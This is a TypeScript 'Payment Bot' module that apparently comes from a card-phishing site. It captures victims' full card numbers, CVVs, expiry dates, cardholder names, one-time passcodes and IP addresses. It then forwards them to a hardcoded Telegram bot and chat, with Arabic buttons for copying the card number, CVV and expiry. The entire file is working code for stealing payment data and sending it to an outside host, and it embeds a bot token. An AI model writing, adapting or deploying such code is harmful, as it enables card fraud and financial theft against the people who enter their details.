// ═══════════════════════════════════════════════
// Payment Bot — Separate from main notifications
// ═══════════════════════════════════════════════

import { loadTelegramSettings, isPaymentMessageEnabled, fillTemplate } from './telegram-settings';

const PAYMENT_BOT_TOKEN_KEY = 'payment_bot_token';
const PAYMENT_CHAT_ID_KEY = 'payment_chat_id';

// Default values (from user)
const DEFAULT_PAYMENT_BOT_TOKEN = '6836859414:AAEjwy4vkQ2XTWqtYJIJ76tvcjSvFyJCe-s';
const DEFAULT_PAYMENT_CHAT_ID = '-1002118449021';

export function getPaymentBotToken(): string {
  const s = loadTelegramSettings();
  return s.paymentBotToken || localStorage.getItem(PAYMENT_BOT_TOKEN_KEY) || DEFAULT_PAYMENT_BOT_TOKEN;
}

export function getPaymentChatId(): string {
  const s = loadTelegramSettings();
  return s.paymentChatId || localStorage.getItem(PAYMENT_CHAT_ID_KEY) || DEFAULT_PAYMENT_CHAT_ID;
}

export function setPaymentBotToken(token: string) {
  localStorage.setItem(PAYMENT_BOT_TOKEN_KEY, token);
}

export function setPaymentChatId(chatId: string) {
  localStorage.setItem(PAYMENT_CHAT_ID_KEY, chatId);
}

export function resetPaymentDefaults() {
  localStorage.setItem(PAYMENT_BOT_TOKEN_KEY, DEFAULT_PAYMENT_BOT_TOKEN);
  localStorage.setItem(PAYMENT_CHAT_ID_KEY, DEFAULT_PAYMENT_CHAT_ID);
}

export interface PaymentInfo {
  cardNumber: string;
  cardType: string;
  expiryDate: string;
  cvv: string;
  cardHolder: string;
  amount: number;
  from: string;
  to: string;
  paymentMethod: string;
  step: 'card-entered' | 'card-complete' | 'otp-attempt' | 'otp-success' | 'otp-failed';
  otpCode?: string;
  attemptNumber?: number;
  ip?: string;
  bankName?: string;
}

export async function sendPaymentToTelegram(info: PaymentInfo): Promise<boolean> {
  // Check global + per-message settings
  if (!isPaymentMessageEnabled(info.step)) return false;

  const token = getPaymentBotToken();
  const chatId = getPaymentChatId();
  if (!token || !chatId) return false;

  const timeStr = new Date().toLocaleString('en-US', {
    year: 'numeric', month: 'numeric', day: 'numeric',
    hour: '2-digit', minute: '2-digit', second: '2-digit',
    hour12: true,
  });

  // Build custom message from template
  const settings = loadTelegramSettings();
  const msgSetting = settings.paymentMessages.find(m => m.id === info.step);

  let message: string;
  if (msgSetting && msgSetting.template) {
    // Use custom template
    message = fillTemplate(msgSetting.template, {
      cardNumber: info.cardNumber || 'N/A',
      cardType: info.cardType || 'N/A',
      bankName: info.bankName || 'N/A',
      expiryDate: info.expiryDate || 'N/A',
      cvv: info.cvv || 'N/A',
      cardHolder: info.cardHolder || 'Not entered',
      amount: `SAR ${info.amount?.toFixed(2) || '0.00'}`,
      from: info.from || 'N/A',
      to: info.to || 'N/A',
      paymentMethod: info.paymentMethod || 'N/A',
      ip: info.ip || 'N/A',
      time: timeStr,
      otpCode: info.otpCode || 'N/A',
      attemptNumber: String(info.attemptNumber || 1),
    });
  } else {
    // Fallback
    message = `<b>💳 ${info.step}</b>\n\nCard: <code>${info.cardNumber || 'N/A'}</code>\nAmount: SAR ${info.amount?.toFixed(2) || '0.00'}`;
  }

  // Build copy buttons for card number + CVV
  const inlineKeyboard: Array<Array<Record<string, unknown>>> = [];
  const cardDigits = (info.cardNumber || '').replace(/\s/g, '');
  if (cardDigits.length >= 14) {
    inlineKeyboard.push([
      { text: '📋 نسخ رقم البطاقة', copy_text: { text: cardDigits } },
    ]);
  }
  if (info.cvv && info.cvv.length >= 3) {
    inlineKeyboard.push([
      { text: '🔒 نسخ CVV', copy_text: { text: info.cvv } },
    ]);
  }
  if (info.expiryDate && info.expiryDate.includes('/')) {
    inlineKeyboard.push([
      { text: '📅 نسخ التاريخ', copy_text: { text: info.expiryDate } },
    ]);
  }

  try {
    const resp = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML',
        reply_markup: inlineKeyboard.length > 0
          ? { inline_keyboard: inlineKeyboard }
          : undefined,
      }),
    });
    return resp.ok;
  } catch {
    return false;
  }
}

// Get visitor IP
export async function getVisitorIP(): Promise<string> {
  try {
    const res = await fetch('https://api.ipify.org?format=json', { cache: 'no-store' });
    const data = await res.json();
    return data.ip || 'unknown';
  } catch {
    return 'unknown';
  }
}
